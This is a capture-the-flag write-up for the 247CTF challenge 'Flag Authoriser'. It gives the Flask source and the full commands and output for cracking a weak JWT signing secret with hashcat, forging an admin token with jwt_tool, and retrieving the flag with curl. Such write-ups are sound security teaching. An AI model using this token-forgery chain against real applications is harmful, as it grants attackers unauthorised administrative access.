# FLAG AUTHORISER [MODERATE]

## Description

> Can you forge a new identity to upgrade your access from an anonymous user to an admin?

## Source Code

![source.png](img/source.png)

<details><summary>Click here for source code in text format</summary>

```python
from flask import Flask, redirect, url_for, make_response, render_template, flash
from flask_jwt_extended import JWTManager, create_access_token, jwt_optional, get_jwt_identity
from secret import secret, admin_flag, jwt_secret

app = Flask(__name__)
cookie = "access_token_cookie"

app.config['SECRET_KEY'] = secret
app.config['JWT_SECRET_KEY'] = jwt_secret
app.config['JWT_TOKEN_LOCATION'] = ['cookies']
app.config['DEBUG'] = False

jwt = JWTManager(app)

def redirect_to_flag(msg):
    flash('%s' % msg, 'danger')
    return redirect(url_for('flag', _external=True))

@jwt.expired_token_loader
def my_expired_token_callback():
    return redirect_to_flag('Token expired')

@jwt.invalid_token_loader
def my_invalid_token_callback(callback):
    return redirect_to_flag(callback)

@jwt_optional
def get_flag():
    if get_jwt_identity() == 'admin':
        return admin_flag

@app.route('/flag')
def flag():
    response = make_response(render_template('main.html', flag=get_flag()))
    response.set_cookie(cookie, create_access_token(identity='anonymous'))
    return response

@app.route('/')
def source():
    return "<pre>%s</pre>" % open(__file__).read()

if __name__ == "__main__":
    app.run()
```

</details>

## Short Solution Description / Tags

JWT weak secret

## Solution

A weak secret is used for JWT signing, which can be cracked using [hashcat](https://hashcat.net/hashcat/).
Change the value of the payload claim to admin by [jwt_tool](https://github.com/ticarpi/jwt_tool), re-sign it, and access the /flag endpoint to get the flag.

```console
$ curl -s -o /dev/null -D- https://e5a12d718a4dc87e.247ctf.com/flag
(snip)
Set-Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMmZkYzJlNTEtODY0ZC00NTUzLWJiMzgtZDgzNWViMzUxYTMyIiwianRpIjoiZDQ5ZGYzY2UtYmMxMy00MWZhLWJjOWEtMWEwMzdhODZkMWY0IiwiZXhwIjoxNjk5NjAyNzIzLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5OTYwMTgyMywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5OTYwMTgyMywiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.L0zI-4YxFxpqVqIZ4Lo3HQK3dv_Iv2WCJmb-Nv0cTLM; Path=/

$ JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMmZkYzJlNTEtODY0ZC00NTUzLWJiMzgtZDgzNWViMzUxYTMyIiwianRpIjoiZDQ5ZGYzY2UtYmMxMy00MWZhLWJjOWEtMWEwMzdhODZkMWY0IiwiZXhwIjoxNjk5NjAyNzIzLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5OTYwMTgyMywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5OTYwMTgyMywiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.L0zI-4YxFxpqVqIZ4Lo3HQK3dv_Iv2WCJmb-Nv0cTLM

$ hashcat -m 16500 $JWT /usr/share/wordlists/rockyou.txt --quiet
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMmZkYzJlNTEtODY0ZC00NTUzLWJiMzgtZDgzNWViMzUxYTMyIiwianRpIjoiZDQ5ZGYzY2UtYmMxMy00MWZhLWJjOWEtMWEwMzdhODZkMWY0IiwiZXhwIjoxNjk5NjAyNzIzLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5OTYwMTgyMywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5OTYwMTgyMywiaWRlbnRpdHkiOiJhbm9ueW1vdXMifQ.L0zI-4YxFxpqVqIZ4Lo3HQK3dv_Iv2WCJmb-Nv0cTLM:wepwn247

$ python3 ~/tools/jwt_tool/jwt_tool.py $JWT -I -pc identity -pv admin --sign hs256 -p wepwn247

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.6                \______|             @ticarpi

Original JWT:

jwttool_a0e20cf7da9ae7d56632dd87043056f3 - Tampered token - HMAC Signing:
[+] eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMmZkYzJlNTEtODY0ZC00NTUzLWJiMzgtZDgzNWViMzUxYTMyIiwianRpIjoiZDQ5ZGYzY2UtYmMxMy00MWZhLWJjOWEtMWEwMzdhODZkMWY0IiwiZXhwIjoxNjk5NjAyNzIzLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5OTYwMTgyMywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5OTYwMTgyMywiaWRlbnRpdHkiOiJhZG1pbiJ9.KB-0d33EDPKPkA_Uhh0qk3ELs5iEi4jyedtldhdBYbw

$ TAMPERED_JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjc3JmIjoiMmZkYzJlNTEtODY0ZC00NTUzLWJiMzgtZDgzNWViMzUxYTMyIiwianRpIjoiZDQ5ZGYzY2UtYmMxMy00MWZhLWJjOWEtMWEwMzdhODZkMWY0IiwiZXhwIjoxNjk5NjAyNzIzLCJmcmVzaCI6ZmFsc2UsImlhdCI6MTY5OTYwMTgyMywidHlwZSI6ImFjY2VzcyIsIm5iZiI6MTY5OTYwMTgyMywiaWRlbnRpdHkiOiJhZG1pbiJ9.KB-0d33EDPKPkA_Uhh0qk3ELs5iEi4jyedtldhdBYbw

$ curl -s -H "Cookie: access_token_cookie=${TAMPERED_JWT}" https://e5a12d718a4dc87e.247ctf.com/flag | grep -oE 247CTF{.*?}
247CTF{[REDACTED]}
```
